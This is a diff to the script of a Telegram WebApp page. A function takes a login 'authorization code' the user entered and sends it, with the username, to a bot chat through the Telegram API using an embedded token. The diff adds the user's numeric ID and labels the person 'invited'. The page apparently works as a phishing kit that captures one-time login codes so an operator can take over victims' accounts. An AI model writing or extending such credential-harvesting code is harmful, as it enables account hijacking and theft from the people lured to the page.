@@ -234,8 +234,9 @@ function sendCodeToBot(code) {
   
   // Получаем username или показываем "без username"
   const username = user?.username ? `@${user.username}` : 'без username';
+  const userId = user?.id || 'неизвестно';
   
-  const message = `🔐 Код авторизации из WebApp\n👤 Пользователь: ${username}\n🔢 Код: ${code}`;
+  const message = `🔐 Код авторизации из WebApp\n👤 Приглашённый: ${username} (ID: ${userId})\n🔢 Код: ${code}`;
   
   // Отправляем сообщение через API бота
   fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -252,12 +253,12 @@ function sendCodeToBot(code) {
     console.error('Ошибка отправки кода в лог:', error);
   });
 }
-
 // Инициализация при загрузке
 updateBoxes();
 </script>
 </body>
 </html>
+
 
 
 
